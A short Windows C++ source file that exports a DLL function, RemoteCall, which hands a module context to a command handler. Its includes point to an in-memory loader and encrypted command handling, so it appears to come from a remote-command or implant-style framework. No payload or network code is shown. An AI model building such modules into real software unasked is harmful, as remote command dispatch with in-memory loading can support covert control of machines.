#include <Windows.h>
#include <vector>
#include <globalvars.h>
#include <string> 
#include <AES.h>
#include <random>
#include <mem_ldr.h>
#include <cmd_handler.h>
#include <syslib.hpp>
#include <module_context.h>

BOOL check_connection(int bytes) {
	if (bytes <= 0) {
		return false;
	}
	return true;
}

extern "C" __declspec(dllexport) NTSTATUS RemoteCall(PMODULE_CONTEXT ctx) {
	NTSTATUS status = ERROR_SUCCESS;
	status = handle_cmd(ctx);
	return status;
}